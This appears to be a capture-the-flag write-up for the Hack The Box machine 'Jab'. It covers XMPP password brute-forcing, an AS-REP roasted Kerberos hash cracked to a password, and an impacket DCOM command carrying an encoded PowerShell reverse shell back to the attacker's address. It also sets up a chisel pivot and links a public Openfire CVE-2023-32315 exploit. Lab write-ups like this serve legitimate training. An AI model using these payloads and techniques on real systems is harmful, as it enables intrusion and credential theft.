Download pidgin for xmpp connections. Then create a user. In the test2 chat room you will find a user bdavis. Try and bruteforce his login. You will get a hit with Welcome1. Once logged in as bdavis. You can join the pentest chat where you will see the user adunn, hthompson and the cracked krbtgt ticket for svc_openfire.


# ASREPRoasting
I was able to extract some Kerberos pre auth tickets and then went onto crack them
```shell
$krb5asrep$23$jmontgomery@JAB.HTB:666bae082e31a5ca9f7d95e2d23721ad$3b4097e08690dc8cbdc9a9abeafdcc727392370d4125a1e64bc8844e615fc194f7b9a360f16bcbf5229126b1d58a7e178ffa9bf0e5f40eedc409e5ae4c0c47357106286d8d5a4831ba7f2c9395b2f816bb171c89afa583fd4c4f6a56361c9836b15486f2a210dacf39ef344b8fe887c14d7b8bd7cfed885d7854c23b8306dad3003997725ae228f72404952648dcf961c3675383b495396d8d4757fd1a1cc02d5ef4dc5959f900ef2dfbd9ae790ce78903bb0597f4c21ef97f80cb1a88a5eb78c75579518f452a328371389b016591e67c3a66aec953cb9b299f6d99a2c195d0c30d:Midnight_121

```

# ExecuteDCOM Rights

![[Pasted image 20240418075621.png]]

Using impackets Dcom package we are able to gain a reverse shell
```shell
impacket-dcomexec 'jab.htb/svc_openfire:!@#$%^&*(1qazxsw@dc01.jab.htb' 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANQAiACwANgA5ADYAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=' -nooutput -object MMC20 -dc-ip 10.10.11.4

Impacket v0.12.0.dev1+20240327.181547.f8899e65 - Copyright 2023 Fortra

```
## Rev Shell
```shell
nc -lvnp 6969    
listening on [any] 6969 ...
connect to [10.10.14.5] from (UNKNOWN) [10.10.11.4] 60042
whoami
jab\svc_openfire
PS C:\windows\system32> 

```

# Priv Esc
```powershell
netstat -ano | findstr '127.0.0.1:'

  TCP    127.0.0.1:9090         0.0.0.0:0              LISTENING       3120
  TCP    127.0.0.1:9091         0.0.0.0:0              LISTENING       3120

```
Its a website
```html 
PS C:\windows\system32> Invoke-WebRequest -Uri http://127.0.0.1:9090/ -UseBasicParsing


StatusCode        : 200
StatusDescription : OK
Content           : <html>
                    <head><title></title>
                    <meta http-equiv="refresh" content="0;URL=index.jsp">
                    </head>
                    <body>
                    </body>
                    </html>
                    
                    
RawContent        : HTTP/1.1 200 OK
                    Accept-Ranges: bytes
                    Content-Length: 115
                    Content-Type: text/html
                    Date: Thu, 18 Apr 2024 07:11:38 GMT
                    Last-Modified: Wed, 16 Feb 2022 15:55:02 GMT
                    
                    <html>
                    <head><title></title>
                    <...
Forms             : 
Headers           : {[Accept-Ranges, bytes], [Content-Length, 115], [Content-Type, text/html], [Date, Thu, 18 Apr 2024 
                    07:11:38 GMT]...}
Images            : {}
InputFields       : {}
Links             : {}
ParsedHtml        : 
RawContentLength  : 115

```

# Setting up the pivot
We are going to use chischisel

## Attack Box
```shell
chisel server -p 9999 --reverse
```

## Setup client on DC then connect to server
We need to transfer the chisel.exe to the DC
```shell
chisel client 10.10.14.5:9999 R:9090:127.0.0.1:9090
```

Now the pivot is setup

# Openfire
We can go to http://127.0.0.1:9090/login.jsp?url=%2Findex.jsp
![[Pasted image 20240418084108.png]]
# RCE Via Plugins

Download the following and follow the instructions:
```shell
git clone https://github.com/miko550/CVE-2023-32315.git

```